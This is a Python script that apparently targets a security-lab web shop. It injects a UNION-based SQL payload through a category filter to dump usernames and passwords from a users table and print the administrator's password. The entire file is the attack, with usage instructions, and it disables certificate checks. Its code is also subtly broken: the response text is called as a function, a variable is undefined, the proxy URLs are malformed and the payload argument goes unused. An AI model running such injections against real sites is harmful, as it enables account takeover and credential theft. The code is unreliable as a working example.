import sys
import requests
import urllib3
from bs4 import BeautifulSoup


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http//127.0.0.1:8080', 'https':'https//127.0.0.1:8080'}

def exploit_sqli_usersTable(s, url):
    username = "administrator"
    path = "/filter?category=Gifts"
    sql_payload = "'union select username, password from users--"
    r = s.get(url+path+sql_payload, verify=False, proxies=proxies)
    res =r.text()
    if 'administrator' in res:
        print("[+] Found the administrator's password")
        soup = BeautifulSoup(res, 'html.parser')
        admin_password = soup.body.find(text='administrator')
        parent.findNext('td').contents[0]
        print("(+) The administrator's password is " + admin_password)
        return True
    return False

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print(" (+) Usage: %s <url><payload>" % sys.argv [0])
        print(" (+) Example: %s www.example.com ' 1=1 '" % sys.argv[0])
        sys.exit(-1)   
    s = requests.Session()
    print("(+) Dumping the list of usernames and passwords...")
    if not exploit_sqli_usersTable(s, url):
        print("(+) Did not found an administrator password.")